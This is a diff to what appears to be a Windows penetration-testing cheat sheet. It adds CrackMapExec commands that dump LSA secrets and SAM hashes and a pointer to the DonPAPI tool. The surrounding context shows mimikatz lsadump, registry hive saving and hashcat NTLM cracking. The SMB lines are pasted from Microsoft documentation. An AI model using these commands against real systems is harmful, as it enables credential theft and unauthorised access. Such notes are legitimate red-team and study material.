@@ -311,6 +311,8 @@ Get-ChildItem -Path .\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Rec
 
 ### DPAPI
 
+Or just use `https://github.com/login-securite/DonPAPI`
+
 ```powershell
 
 #find DPAPI credentials
@@ -697,7 +699,9 @@ If found then search in the directory for strings within files
 
 `findstr /si password *.xml *.ini *.txt`
 
-#### SAM/SYSTEM password hashes
+
+
+#### dump password hashes
 
 
 reg save HKLM\SAM C:\wamp64\attendance\images\test\SAM
@@ -713,7 +717,9 @@ OR user mimikatz
 lsadump::lsa /patch
 
 ```
+`cme smb ms01.xxx.xxx -u Administrator -p xxx  --lsa --local-auth`
 
+`cme smb ms01.xxx.xxx -u Administrator -p xxx  --sam --local-auth`
 
 * crack NTLM if needed `hashcat -m 1000 --force hash /wordlist`
 
@@ -1158,5 +1164,53 @@ Enable-PSRemoting -SkipNetworkProfileCheck -Force
 
 winrm quickconfig -y
 
+# new SMB share
+
+New-SmbShare -Name "wapa" -Path "C:\wapa"
+
+# control SMB
+
+SMBv1
+Detect:
+
+PowerShell
+
+Copy
+Get-SmbServerConfiguration | Select EnableSMB1Protocol
+Disable:
+
+PowerShell
+
+Copy
+Set-SmbServerConfiguration -EnableSMB1Protocol $false
+Enable:
+
+PowerShell
+
+Copy
+Set-SmbServerConfiguration -EnableSMB1Protocol $true
+For more information, see Server storage at Microsoft.
+
+SMB v2/v3
+Detect:
+
+PowerShell
+
+Copy
+Get-SmbServerConfiguration | Select EnableSMB2Protocol
+Disable:
+
+PowerShell
+
+Copy
+Set-SmbServerConfiguration -EnableSMB2Protocol $false
+Enable:
+
+PowerShell
+
+Copy
+Set-SmbServerConfiguration -EnableSMB2Protocol $true
+
 ```
+
 
